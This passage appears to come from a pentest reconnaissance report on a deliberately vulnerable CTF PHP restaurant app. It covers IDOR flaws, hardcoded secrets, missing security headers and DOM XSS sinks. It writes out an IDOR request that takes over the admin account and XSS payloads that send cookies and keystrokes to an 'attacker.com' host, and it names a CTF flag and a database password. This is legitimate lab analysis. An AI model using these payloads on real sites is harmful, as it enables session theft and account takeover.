     - Default role set to 'visitor' by database constraint (init.sql line 40)
   - **Attack Vectors:** Mass fake account creation, username/email enumeration via error messages, weak password registration

8. **`/api/search_restaurants.php` (GET) - Restaurant Search**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/search_restaurants.php`
   - **Authentication Required:** No - public search functionality
   - **Input Parameters:**
     - `query` (string) - Search term for restaurant name or category (line 6)
   - **Security Analysis:**
     - Uses prepared statements with parameter binding: `$stmt->bindParam(':name_query', $searchQuery, PDO::PARAM_STR)` (lines 12-15)
     - Protected against SQL injection
     - Returns JSON array of restaurant objects with fields: id, name, address, latitude, longitude, description, category
     - **VULNERABILITY:** Line 19 exposes database errors to users: `echo json_encode(['success' => false, 'message' => 'Database error: ' . $e->getMessage()]);` (information disclosure)
     - No rate limiting (search engine exhaustion attacks possible)
     - Public endpoint allows data harvesting (entire restaurant database can be exfiltrated via search)
   - **Attack Vectors:** Database enumeration, information disclosure via error messages, data exfiltration

**AUTHENTICATED API ENDPOINTS:**

9. **`/api/get_favorite_restaurants.php` (GET) - Retrieve User's Favorite Restaurants**
   - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/get_favorite_restaurants.php`
   - **Authentication Required:** YES - Lines 7-10 verify `$_SESSION['user_id']` exists
   - **Input Parameters:**
     - `userId` (integer) - User ID to fetch favorites for (line 14)
   - **Security Analysis:**
     - **CRITICAL IDOR VULNERABILITY:** Line 14 accepts `userId` from GET parameter without authorization check
     - Does NOT verify that `$_GET['userId']` matches `$_SESSION['user_id']`
     - Prepared statement prevents SQL injection (lines 17-24): complex JOIN query with `:user_id` parameter
     - Returns JSON array of username and restaurant_name pairs
     - **EXPLOIT:** Any authenticated user can view any other user's favorites by changing the `userId` parameter
   - **Attack Vectors:**
     ```http
     GET /api/get_favorite_restaurants.php?userId=1 HTTP/1.1  # View user 1's favorites
     GET /api/get_favorite_restaurants.php?userId=7 HTTP/1.1  # View admin's favorites
     ```
   - **Impact:** Horizontal privilege escalation, privacy violation, data exfiltration of all users' preferences

10. **`/api/change_password.php` (POST) - Password Change Endpoint**
    - **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/change_password.php`
    - **Authentication Required:** YES - Lines 7-10 verify `$_SESSION['user_id']`
    - **Input Parameters:**
      - `oldPassword` (string) - Current password for verification (line 13)
      - `newPassword` (string) - New password to set (line 14)
      - `confirmPassword` (string) - Confirmation of new password (line 15)
      - `userId` (integer) - Target user ID for password change (line 31)
    - **Security Analysis:**
      - **CRITICAL AUTHORIZATION BYPASS (IDOR):** Line 31 uses `$_POST['userId']` instead of `$_SESSION['user_id']` in UPDATE statement
      - Line 26 verifies old password for `$_SESSION['user_id']` (the authenticated user)
      - Line 31 updates password for `$_POST['userId']` (attacker-controlled parameter)
      - **LOGIC FLAW:** Verifies password of user A, changes password of user B
      - Proper password hashing: `password_hash($newPassword, PASSWORD_BCRYPT)` (line 22)
      - Prepared statements prevent SQL injection (lines 25-26, 30-31)
      - **MISSING:** No CSRF protection
      - **MISSING:** No password complexity validation on new password
      - **MISSING:** No session invalidation after password change (old sessions remain valid)
    - **EXPLOIT:**
      ```http
      POST /api/change_password.php HTTP/1.1
      Cookie: PHPSESSID=<attacker-session>
      
      oldPassword=attacker-password&newPassword=hacked123&confirmPassword=hacked123&userId=7
      ```
    - **Impact:** Complete account takeover of any user including admin, CTF flag capture, horizontal privilege escalation

### Internal Service Communication

**NOT APPLICABLE** - This is a monolithic single-container application with no microservices architecture, no service-to-service communication, and no internal API gateways. All components (Apache, PHP, MySQL) run within the same Docker container on localhost networking (127.0.0.1). There are no trust boundaries between services, no authentication between components, and no network segmentation. The MySQL database is accessed directly via localhost socket from PHP using hardcoded credentials (config.php line 6: `$pass = "P@ssw0rd123!"`).

If this application were refactored into microservices, current architectural decisions would create severe security issues: no service authentication (MySQL has password but no mutual TLS), no service authorization (web user has ALL PRIVILEGES), no network policies (all services on same network), and no service mesh security controls.

### Input Validation Patterns

The application demonstrates **minimal and inconsistent input validation**, relying almost exclusively on database constraints and prepared statements rather than application-layer validation. Across all 10 entry points, input handling follows a dangerous pattern of directly accepting `$_POST` and `$_GET` superglobal values without sanitization, format validation, or security checks.

**Server-Side Input Validation:** The only input validation observed is in `/api/change_password.php` lines 17-20, which checks that `newPassword` matches `confirmPassword`:

```php
if ($newPassword !== $confirmPassword) {
    echo json_encode(['success' => false, 'message' => 'Passwords do not match.']);
    exit();
}
```

This is **functional validation** (ensuring user didn't mistype), not **security validation**. There is no password complexity checking, no minimum length enforcement, no character requirement validation, and no maximum length limit (beyond the database VARCHAR(255) constraint).

**Missing Validation Patterns:**

- **Email Validation:** `/api/register.php` line 8 accepts any string as email: `$email = $_POST['email'];` with no regex validation, no MX record checking, no format verification. Users can register with `email = "notanemail"` or `email = "<script>alert(1)</script>"`.

- **Username Validation:** `/api/register.php` line 7 accepts any string as username with no character whitelisting, no length limits (beyond database), no profanity filtering, no reserved name checking (could register as "admin" if not taken).

- **Password Strength:** All password-accepting endpoints accept any password, including single-character passwords (`"a"`), numeric-only passwords, common passwords ("password123"), or empty strings (if database constraint is removed).

- **Integer Validation:** `/api/get_favorite_restaurants.php` line 14 uses `$userId = $_GET['userId'];` without verifying it's an integer. While PDO's `PDO::PARAM_INT` type hint on line 24 provides some protection, the application should validate input is numeric before passing to database layer.

- **Length Limits:** No server-side enforcement of maximum input lengths. While database VARCHAR constraints prevent overflow, the application doesn't reject excessively long inputs early, potentially allowing resource exhaustion attacks.

**Client-Side Validation:** No evidence of client-side validation in the provided code excerpts. JavaScript validation may exist in the full HTML forms, but client-side validation is not a security control (can be bypassed by direct API calls).

**SQL Injection Protection (The Exception):** The one area where the application demonstrates strong security is prepared statement usage. Every database query across all 5 API endpoints uses parameterized queries with either `execute(['param' => $value])` or `bindParam()` syntax, preventing SQL injection despite the lack of input sanitization. This is the **only effective security control** protecting user input from exploitation.

### Background Processing

The application implements **no background job processing**, no asynchronous task queues, no scheduled jobs (cron), and no webhook callbacks that trigger delayed processing. All request handling is synchronous: HTTP request → PHP processing → database query → HTTP response. There are no components like:

- **Job Queues:** No Redis queue, no RabbitMQ, no database-backed job tables
- **Scheduled Tasks:** No cron jobs, no periodic data cleanup, no scheduled reports
- **Webhooks:** No outbound webhook delivery, no callback retry logic, no webhook signature validation
- **Email Sending:** No password reset emails, no verification emails, no asynchronous email queue
- **File Processing:** No image resize jobs, no PDF generation, no file virus scanning

The absence of background processing **reduces attack surface** by eliminating several vulnerability classes: no job queue injection attacks, no scheduled task privilege escalation, no webhook SSRF vulnerabilities, and no asynchronous race conditions. However, it also indicates missing security features: no automated session cleanup (sessions persist until PHP garbage collection), no automated account lockout (no failed login attempt tracking), and no security monitoring jobs.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**CRITICAL VULNERABILITIES - Hardcoded Secrets in Version Control:**

The application commits multiple critical secrets directly to the Git repository in plaintext, violating fundamental security principles:

1. **Database Password - Hardcoded in Source Code**
   - **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/include/config.php` (Line 6)
   - **Code:** `$pass = "P@ssw0rd123!";`
   - **Also in:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/init.sql` (Line 19)
   - **Impact:** Anyone with repository access (developers, contractors, GitHub/GitLab users if public, leaked repositories, stolen backups) has full database access credentials
   - **Risk:** Credentials cannot be rotated without code changes, appear in Git history permanently (even if removed later), exposed in Docker image layers

2. **CTF Flag - Committed in .env File**
   - **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/.env` (Line 1)
   - **Code:** `FLAG="flag{faba79b5-8a02-43ad-aea8-e28cf8fd9024}"`
   - **Impact:** Flag value visible to anyone with repository access, defeats the purpose of CTF challenge if source code is published
   - **Proper Usage:** The application correctly loads this via `getenv('FLAG')` in profile.php (line 15), but the .env file should be in .gitignore with only .env.example committed

**Partial Environment Variable Usage:**

The application demonstrates **inconsistent secret management practices**. The CTF flag uses a proper environment variable pattern (Docker Compose passes FLAG as build arg at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/docker-compose.yml` lines 5-6, Dockerfile sets as environment variable at lines 32-33, PHP loads via `getenv('FLAG')` at profile.php line 15), but this pattern is **not applied to database credentials**. The config.php file hardcodes the database password rather than using `getenv('DB_PASSWORD')`, creating an inconsistent security posture.

**No Secret Management System:** The application does not integrate with any dedicated secret management solution such as:
- HashiCorp Vault (no Vault client library detected)
- AWS Secrets Manager (no AWS SDK usage)
- Docker Secrets (docker-compose.yml does not use secrets: directive)
- Kubernetes Secrets (no k8s manifests detected)
- Azure Key Vault (no Azure SDK)

**Recommended Remediation:**
1. Remove .env from Git repository: `git rm .env && echo ".env" >> .gitignore`
2. Remove hardcoded password from config.php and init.sql: replace with `getenv('DB_PASSWORD')`
3. Use BFG Repo-Cleaner or git-filter-branch to purge secrets from Git history
4. Rotate all exposed credentials (change database password)
5. Use docker-compose secrets or external secret management for production

### Configuration Security

**Environment Separation:** The application demonstrates **no environment separation** strategy. There is a single configuration file (`config.php`) with hardcoded production values, no separate development/staging/production configurations, no environment-specific .env files (no .env.development, .env.production), and no configuration management per environment.

The Docker deployment pattern suggests this is a development/CTF environment (evidence: FLAG in environment variable, MySQL and Apache in same container, HTTP only), but the architecture provides no mechanism to use different configurations for production. If deployed to production, the same hardcoded credentials would be used, the same HTTP-only configuration would apply, and the same security vulnerabilities would persist.

**Secret Handling:** As documented above, secrets are handled insecurely through hardcoding in source files. The database password appears in two locations (config.php and init.sql), creating synchronization risks where password rotation requires updating multiple files. The FLAG is properly externalized to an environment variable but with the default value committed to .env, creating a false sense of security.

**Security Headers Configuration:**

**CRITICAL FINDING - No Infrastructure-Level Security Headers:** Comprehensive analysis of the application revealed **NO security header configuration** at any layer of the infrastructure stack:

- **Nginx:** No nginx.conf file found (application uses Apache directly)
- **Apache Configuration:** No .htaccess file in web root, no custom Apache configuration in Dockerfile (uses default Ubuntu apache2 config)
- **Application Layer:** No `header()` calls for security headers in any PHP file (only `Content-Type: application/json` in API endpoints and `Location:` redirects)
- **CDN/Proxy:** No CDN configuration (application runs directly on Docker port 80)

**Missing Critical Security Headers:**

1. **`Strict-Transport-Security` (HSTS):** Not configured anywhere. Even if HTTPS were added, browsers would not be forced to use it. Allows SSL stripping attacks.

2. **`Content-Security-Policy`:** Not configured. No CSP header means inline scripts are allowed, making XSS exploitation trivial. The two XSS vulnerabilities in index.php and profile.php can execute arbitrary JavaScript without CSP restrictions.

3. **`X-Frame-Options`:** Not configured. Application can be embedded in iframes on attacker sites, enabling clickjacking attacks where users are tricked into clicking hidden elements (e.g., forcing password changes via hidden iframe of profile.php).

4. **`X-Content-Type-Options`:** Not configured. Browsers will MIME-sniff responses, potentially interpreting uploaded files or user content as executable scripts even if served with wrong Content-Type.

5. **`Referrer-Policy`:** Not configured. Full referrer URLs are sent on navigation, potentially leaking sensitive information in URLs (e.g., session IDs if they were in URLs, search queries, user IDs).

6. **`Permissions-Policy`:** Not configured (modern replacement for Feature-Policy). No restrictions on browser features like camera, microphone, geolocation access.

7. **`Cache-Control` for Sensitive Pages:** Not configured on profile.php or API endpoints. Authenticated pages may be cached by browsers or proxies, exposing sensitive data (FLAG, user email, favorites) in browser history or shared computer caches.

**Search Evidence:**
```bash
# Attempted searches across application:
grep -r "Strict-Transport-Security" app/website/  # No results
grep -r "Content-Security-Policy" app/website/    # No results
grep -r "X-Frame-Options" app/website/            # No results
grep -r "X-Content-Type" app/website/             # No results
grep -r "add_header\|Header set" app/             # No Apache/Nginx header config
```

**Impact:** Without security headers, the application is vulnerable to clickjacking, MIME-sniffing attacks, XSS exploitation without CSP restrictions, SSL stripping (if HTTPS added), and information leakage via referrers and caching.

### External Dependencies

**Backend Dependencies:**

The application uses **no external PHP dependency management** (no composer.json, no vendor directory, no third-party libraries). All functionality is implemented using native PHP functions and built-in extensions:

- **PDO MySQL Extension:** Native PHP extension for database connectivity (php-mysql package)
- **Session Management:** Native PHP sessions (no Redis, no Memcached)
- **Password Hashing:** Native `password_hash()` and `password_verify()` functions
- **HTTP Client:** No external HTTP client libraries (no Guzzle, no cURL wrapper libraries)

This minimal dependency footprint **reduces supply chain attack risk** (no compromised npm/composer packages), eliminates dependency vulnerability scanning needs, and avoids version conflicts. However, it also means the application lacks security-focused libraries that could provide defense-in-depth:

- No CSRF protection library (e.g., no symfony/security-csrf)
- No input validation framework (e.g., no respect/validation)
- No security header middleware (e.g., no bepsvpt/secure-headers)
- No rate limiting library (e.g., no ratelimit/ratelimit)

**Frontend Dependencies:**

- **Bootstrap 5.3.3:** Loaded from CDN at `https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css` and `/dist/js/bootstrap.bundle.min.js`
- **jQuery 3.6.0:** Loaded from CDN at `https://code.jquery.com/jquery-3.6.0.min.js`

Both dependencies are loaded from public CDNs without **Subresource Integrity (SRI) hashes**, creating a supply chain vulnerability: if the CDN is compromised or DNS is hijacked, malicious JavaScript could be injected. Proper SRI implementation would include integrity attributes:

```html
<!-- Current (vulnerable) -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<!-- Secure (with SRI) -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js" 
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" 
        crossorigin="anonymous"></script>
```

**Database Dependencies:**

- **MySQL 8.0.37:** Installed via `apt install mysql-server` in Dockerfile (line 16)
- No ORM libraries (no Doctrine, no Eloquent, no Propel)
- Direct PDO usage for all database interactions

**Infrastructure Dependencies:**

- **Base Image:** `ubuntu:20.04` (Dockerfile line 1) - Official Ubuntu image, but not pinned to specific SHA, allowing image updates to change behavior
- **Apache 2.4:** Installed via `apt install apache2` (Dockerfile line 16)
- **PHP 7.4:** Installed via `apt install php php-mysql` (Dockerfile line 16)
- **Supervisord:** Installed via `apt install supervisor` for process management

**Security Implications:**

The application uses **unversioned apt packages**, meaning Docker builds could pull different package versions over time, introducing behavior changes or security vulnerabilities. Best practice would pin package versions in Dockerfile: `apt install apache2=2.4.41-4ubuntu3.14 php7.4=7.4.3-4ubuntu2.18` to ensure reproducible builds.

### Monitoring & Logging

**APPLICATION-LEVEL LOGGING: NOT IMPLEMENTED**

The application has **zero security event logging**. None of the following security events are logged:

- **Authentication Events:** No logging of login attempts (success or failure), no tracking of authentication source IPs, no detection of brute force patterns
- **Authorization Failures:** No logging when users attempt to access resources they shouldn't (though authorization checks are broken anyway)
- **Password Changes:** No audit trail when passwords are modified via `/api/change_password.php`, making it impossible to detect the IDOR exploit
- **Account Registration:** No logging of new user registrations, allowing mass account creation to go undetected
- **Data Access:** No logging of which users accessed which resources, making privacy breach investigations impossible
- **Error Conditions:** Database errors exposed to users (search_restaurants.php line 19) but not logged server-side for investigation

**INFRASTRUCTURE LOGGING:**

The only logging present is at the infrastructure level via **Supervisord** and **Apache**:

- **Supervisord Logs:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/supervisord.conf` configures:
  - Apache stdout/stderr: `/var/log/apache2/apache2.stdout.log` and `apache2.stderr.log`
  - MySQL stdout/stderr: `/var/log/mysql.stdout.log` and `mysql.stderr.log`
  - These logs are **ephemeral** (stored inside container, lost when container is destroyed unless volumes are configured)

- **Apache Access Logs:** Default Apache access logs would capture HTTP requests (GET/POST paths, status codes, IPs) but:
  - No evidence of custom logging configuration
  - No structured logging (JSON format for SIEM ingestion)
  - No log forwarding to external systems (no Fluentd, no Logstash, no CloudWatch)

**MISSING SECURITY MONITORING:**

The application has no security monitoring capabilities:

- **No Intrusion Detection:** No fail2ban, no OSSEC, no Wazuh, no intrusion detection rules
- **No Anomaly Detection:** No behavioral analysis, no rate limit monitoring, no anomaly alerting
- **No SIEM Integration:** No log forwarding to Splunk, ELK Stack, Graylog, or cloud SIEM services
- **No Alerting:** No alerts for suspicious activity, no notifications for security events, no incident response triggers
- **No Metrics:** No Prometheus metrics, no performance monitoring, no application health tracking

**IMPACT:**

Without logging and monitoring, security incidents are **invisible**. If an attacker exploits the IDOR vulnerability to change the admin password, there would be:

- No log entry showing the password change occurred
- No record of which authenticated user triggered the change
- No alert to security team
- No forensic evidence for incident response
- No ability to detect ongoing attack campaigns

The application violates compliance requirements (GDPR audit trail, PCI-DSS logging, SOC 2 monitoring) and makes security incident response impossible.

---

## 7. Overall Codebase Indexing

The Food App codebase follows a **traditional PHP monolithic web application structure** with minimal framework abstraction, representing a straightforward LAMP stack implementation. The repository root at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/` contains two primary directories: `app/` housing all application code and deployment configuration, and `outputs/` containing security scan results from pre-reconnaissance tools. The application's organizational simplicity is both an advantage (easy to understand and audit) and a security liability (no framework-enforced security patterns).

The `app/website/` directory serves as the Apache DocumentRoot and contains all network-accessible PHP files, organized in a flat structure with no MVC framework separation between models, views, and controllers. Public-facing pages (`index.php`, `login.php`, `register.php`, `profile.php`, `logout.php`) reside at the root level, while the `api/` subdirectory contains five REST-ish endpoints implementing backend business logic. This flat organizational structure means there is **no routing layer** that could enforce authentication globally—each PHP file must implement its own authentication checks (via `session_start()` and `$_SESSION['user_id']` verification), creating opportunities for missing authorization checks as demonstrated by the IDOR vulnerabilities. The `include/` subdirectory contains only `config.php` for database connectivity, representing the sole shared library code. Static assets reside in `static/images/` with restaurant placeholder images.

The database initialization script (`app/init.sql`) is architecturally significant for security analysis: it contains complete schema definitions for three tables (`users`, `favorite_restaurants`, `restaurants`), all user account seed data with bcrypt password hashes, the database user creation with hardcoded credentials and excessive privileges (ALL PRIVILEGES), and 140 restaurant records including geographic coordinates. Critically, the Dockerfile deletes init.sql after execution (line 28: `RUN mysql ... && rm /app/init.sql`), a positive security practice preventing schema discovery from filesystem access, but the same schema is committed to Git repository where it remains permanently accessible.

The **Docker-based deployment architecture** uses `docker-compose.yml` as the orchestration entry point, which delegates to `app/Dockerfile` for container image construction. The Dockerfile follows a single-container anti-pattern, installing both apache2 and mysql-server in the same image, configuring supervisord to manage both processes, and exposing only port 80. Build automation is handled by a `Makefile` that includes `../common.mk` (external build configuration not visible in this repository), suggesting this application is part of a larger CTF or testing framework with shared build conventions. This build orchestration pattern impacts security discoverability: developers familiar with this repository structure would know to look in `app/Dockerfile` for infrastructure configuration, `app/init.sql` for database schema, `app/website/include/config.php` for connection strings, and `docker-compose.yml` for environment variables.

The absence of modern development tooling is notable: there is **no composer.json** (no PHP dependency management), no package.json (no JavaScript build process), no .gitignore (all files including secrets are committed), no README.md (no documentation), no tests/ directory (no automated testing), no CI/CD pipeline configuration (.github/workflows/, .gitlab-ci.yml), and no code quality tools (phpcs.xml, psalm.xml, phpstan.neon). This minimal tooling footprint suggests a rapid development or CTF challenge context rather than a production-grade application. From a security perspective, the lack of automated security scanning (no SAST, no dependency vulnerability scanning, no pre-commit hooks) means vulnerabilities are unlikely to be caught before deployment.

**Code generation and templating conventions:** The application uses **no code generation** (no ORM model generators, no scaffolding tools, no automatic CRUD generation) and **no server-side templating engines** (no Twig, no Blade, no Smarty). All HTML is written inline in PHP files using `<?php ?>` tags for dynamic content insertion. This inline PHP approach creates security implications: developers must manually remember to call `htmlspecialchars()` for every dynamic output, there is no automatic XSS escaping as provided by modern template engines, and the mixing of HTML and PHP makes security code review more difficult than templated approaches.

**Testing framework absence:** The complete lack of a `tests/` directory or testing framework (no PHPUnit, no Codeception, no Behat) means there are no security test cases validating that authorization checks work correctly, no regression tests ensuring CSRF tokens are required, and no integration tests verifying session security flags are set. The IDOR vulnerabilities in this application could have been caught by basic integration tests verifying that user A cannot access user B's data, but no such tests exist. This testing gap directly contributes to the security posture—authorization bugs persist because there is no automated verification of security requirements.

---

## 8. Critical File Paths

### Configuration Files
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/.env` - CTF flag storage (hardcoded default value)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/include/config.php` - Database connection configuration with hardcoded credentials
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/docker-compose.yml` - Container orchestration, flag environment variable passing
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/Dockerfile` - Container build configuration, service installation, flag environment setup
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/supervisord.conf` - Process manager configuration (Apache + MySQL)

### Authentication & Authorization
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/login.php` - Authentication endpoint (session fixation, no rate limiting, bcrypt verification)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/register.php` - User registration endpoint (no input validation, bcrypt hashing)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/change_password.php` - **CRITICAL IDOR vulnerability** (line 31 userId from POST)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/logout.php` - Session destruction (incomplete cleanup, CSRF vulnerable)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/profile.php` - Authenticated user profile page (lines 5-8 auth check, lines 123-126 admin flag display, **XSS vulnerability lines 183-190**)

### API & Routing
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/index.php` - Home page and search interface (**XSS vulnerability lines 254-264**)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/login.php` - Login form UI
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/register.php` - Registration form UI
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/search_restaurants.php` - Restaurant search endpoint (public, SQL injection protected, error disclosure line 19)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/get_favorite_restaurants.php` - **CRITICAL IDOR vulnerability** (line 14 userId from GET parameter)

### Data Models & Database Interaction
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/init.sql` - Database schema initialization, user seed data, hardcoded credentials (line 19), admin account (line 62), excessive privileges (lines 19-21)

### Dependency Manifests
- **NONE** - No composer.json, no package.json, no dependency management files (uses native PHP only)

### Sensitive Data & Secrets Handling
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/.env` - **CRITICAL:** Flag value in version control
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/include/config.php` - **CRITICAL:** Hardcoded database password (line 6)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/api/register.php` - Password hashing implementation (line 9 bcrypt)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/profile.php` - Flag retrieval via getenv() (line 15)

### Middleware & Input Validation
- **NONE** - No dedicated middleware files, no input validation libraries, no security middleware layer

### Logging & Monitoring
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/supervisord.conf` - Infrastructure logging configuration (Apache and MySQL logs)
- **NO APPLICATION-LEVEL LOGGING FILES**

### Infrastructure & Deployment
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/docker-compose.yml` - Service orchestration, port 80 exposure, flag build argument
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/Dockerfile` - Container build, chmod 777 vulnerability (line 22), service installation, flag environment variable
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/Makefile` - Build automation (includes external common.mk)

### CTF Flag Storage
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/.env` - Flag value: `flag{faba79b5-8a02-43ad-aea8-e28cf8fd9024}` (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/docker-compose.yml` - Flag passed as build argument (lines 5-6)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/Dockerfile` - Flag set as environment variable (lines 32-33: ARG FLAG, ENV FLAG=$FLAG)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/profile.php` - Flag display to ADMIN role users (lines 15, 123-126)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/init.sql` - Admin account (user ID 7, username 'admin', line 62) with access to flag

---

## 9. XSS Sinks and Render Contexts

### CRITICAL FINDING #1: DOM-Based XSS in Restaurant Search Results (index.php)

**Sink Type:** XSS (HTML Body Context)  
**Render Context:** jQuery `.append()` with unsafe HTML string concatenation in search results display

**File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/index.php`  
**Line Numbers:** 254-264

**Code Snippet:**
```javascript
results.forEach(function(restaurant) {
    resultsContainer.append(
        '<div class="card mb-3">' +
            '<div class="card-body">' +
                '<h5 class="card-title">' + restaurant.name + '</h5>' +
                '<p class="card-text">' + restaurant.description + '</p>' +
                '<p class="card-text"><small class="text-muted">' + restaurant.category + '</small></p>' +
            '</div>' +
        '</div>'
    );
});
```

**Input Source:**
- **Origin:** AJAX response from `/api/search_restaurants.php` (GET parameter `query`)
- **Data Flow:** User search term → SQL LIKE query → MySQL `restaurants` table → JSON response → JavaScript variable `results`
- **User-Controllable Fields:** `restaurant.name`, `restaurant.description`, `restaurant.category` (if attacker can insert malicious data into restaurants table)

**Sanitization Status:**
- **Backend:** `/api/search_restaurants.php` uses prepared statements (lines 12-15), preventing SQL injection but **NOT sanitizing output**
- **Frontend:** **NO SANITIZATION** - Raw database values concatenated directly into HTML strings
- **Output Encoding:** None - `restaurant.name` inserted as-is into HTML without HTML entity encoding

**Exploitability:** **CRITICAL**

**Attack Vector:**
1. **Data Injection:** Attacker needs to inject malicious JavaScript into the `restaurants` database table. Potential methods:
   - Exploit another vulnerability (SQL injection if found, though none identified)
   - If admin interface exists for adding restaurants (not found in codebase), use legitimate restaurant creation
   - Database compromise via hardcoded credentials (config.php line 6: `P@ssw0rd123!`)
   - Initial database seed (init.sql contains restaurant data that could include payloads for CTF)

2. **Payload Examples:**
   - **Alert Box:** `restaurant.name = "Pizza Place<script>alert('XSS')</script>"`
   - **Session Theft:** `restaurant.name = "Pizza<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"`
   - **DOM Manipulation:** `restaurant.name = "Pizza<img src=x onerror='document.body.innerHTML=\"HACKED\"'>"`
   - **Keylogger:** `restaurant.name = "Pizza<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>"`

3. **Execution Flow:**
   - User visits `/index.php` and performs search (or page loads with featured restaurants)
   - AJAX request to `/api/search_restaurants.php?query=pizza`
   - API returns malicious restaurant data in JSON
   - JavaScript loops through results (line 254)
   - Malicious payload concatenated into HTML string (line 257)
   - jQuery `.append()` renders the HTML with embedded script tags
   - Script executes in victim's browser context with full access to DOM and cookies

**Impact:**
- **Session Hijacking:** With no HttpOnly flag on session cookies, `document.cookie` exposes PHPSESSID, enabling account takeover
- **Credential Theft:** Inject fake login form, capture credentials when users re-authenticate
- **FLAG Exfiltration:** For ADMIN users, inject script to read flag from `/profile.php` and send to attacker server
- **Privilege Escalation:** Use XSS to call `/api/change_password.php` with CSRF (no CSRF tokens), change admin password
- **Malware Distribution:** Redirect users to malicious sites, exploit browser vulnerabilities
- **Persistent XSS:** Since payload is stored in database, affects all users who view the malicious restaurant

**Network Accessible:** YES - `/index.php` is publicly accessible to all users (no authentication required)

**Proof of Concept:**

If the `restaurants` table contains a record with:
```sql
INSERT INTO restaurants (name, category, description) VALUES 
('Tasty Pizza<script>alert(document.cookie)</script>', 'Italian', 'Best pizza in town');
```

The rendered HTML becomes:
```html
<h5 class="card-title">Tasty Pizza<script>alert(document.cookie)</script></h5>
```

When the page loads, the script tag executes, displaying the session cookie in an alert box. In a real attack, this would be replaced with `fetch()` to exfiltrate the cookie to an attacker-controlled server.

---

### CRITICAL FINDING #2: DOM-Based XSS in Favorite Restaurants List (profile.php)

**Sink Type:** XSS (HTML Body Context + HTML Attribute Context)  
**Render Context:** jQuery `.append()` with unsafe HTML string concatenation in two contexts: `alt` attribute and text node

**File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-069-24/app/website/profile.php`  
**Line Numbers:** 183-190

**Code Snippet:**
```javascript
restaurants.forEach(function(restaurant) {
    var imageSrc = 'static/images/restaurant' + imageIndex + '.jpg';
    list.append(
        '<li class="list-group-item favorite-restaurant">' +
        '<img src="' + imageSrc + '" style="height: 50px; width: 50px; margin-right: 10px;" alt="' + restaurant + '">' +
        restaurant + 
        '</li>'
    );
    imageIndex = (imageIndex % 10) + 1;
});
```

**Input Source:**
- **Origin:** AJAX response from `/api/get_favorite_restaurants.php` (GET parameter `userId`)
- **Data Flow:** userId parameter → Query `favorite_restaurants` table → Join with `users` table → Return `restaurant_name` → JavaScript variable `restaurant`
- **User-Controllable Field:** `restaurant` (the `restaurant_name` column from `favorite_restaurants` table)

**Sanitization Status:**
- **Backend:** `/api/get_favorite_restaurants.php` uses prepared statements (lines 17-24), preventing SQL injection but **NOT sanitizing output**
- **Frontend:** **NO SANITIZATION** - Raw `restaurant_name` value concatenated into HTML in two dangerous locations:
  1. **Line 186:** Inside `alt` attribute: `alt="' + restaurant + '"`
  2. **Line 187:** As direct text node: `restaurant +`

**Exploitability:** **CRITICAL**

**Attack Vector:**

**Method 1: HTML Attribute Breakout (alt attribute):**
1. Attacker inserts malicious restaurant name into `favorite_restaurants` table
2. Payload breaks out of `alt` attribute and injects event handler:
   - **Payload:** `" onerror="alert(document.cookie)` 
